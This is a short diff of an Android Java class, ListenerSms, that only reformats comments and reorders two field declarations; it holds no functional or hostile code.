@@ -12,17 +12,19 @@ package com.android.syssetup.listener;
 import com.android.syssetup.module.message.Sms;
 
 public class ListenerSms extends Listener<Sms> {
-	/** The Constant TAG. */
+	/**
+	 * The Constant TAG.
+	 */
 	private static final String TAG = "ListenerSms"; //$NON-NLS-1$
-
-	private BSm smsReceiver;
-
-	/** The singleton. */
+	/**
+	 * The singleton.
+	 */
 	private volatile static ListenerSms singleton;
+	private BSm smsReceiver;
 
 	/**
 	 * Self.
-	 * 
+	 *
 	 * @return the status
 	 */
 	public static ListenerSms self() {
